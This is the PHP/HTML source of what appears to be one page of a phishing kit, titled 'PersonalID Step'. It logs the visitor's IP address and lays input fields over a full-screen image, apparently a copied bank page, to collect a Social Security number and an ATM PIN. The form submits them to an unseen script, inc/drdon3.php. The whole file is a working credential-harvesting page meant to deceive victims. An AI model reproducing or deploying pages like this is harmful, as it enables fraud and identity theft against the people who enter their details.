<?php

session_start();

$ip = getenv("REMOTE_ADDR");
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<title>PersonalID Step</title>

</head>
<body>

<form name="dd" action="inc/drdon3.php" method="POST">
<div id="wb_Image1" style="position:absolute;left:0px;top:0px;width:1349px;height:614px;z-index:0;">
<img src="img/6.png" id="Image1" alt=""></div>

<input name="ssn" required title="Please Enter Right Value" type="tel" style="position:absolute;width:232px;left:410px;top:226px;z-index:13">
<input name="atmpin" required title="Please Enter Right Value" type="password" style="position:absolute;width:232px;left:410px;top:262px;z-index:13">
<input type="image" src="continue.png" style="position:absolute;left:740px;top:430px;width:174px;height:50px;z-index:0;" alt="">
</form>



</body></html>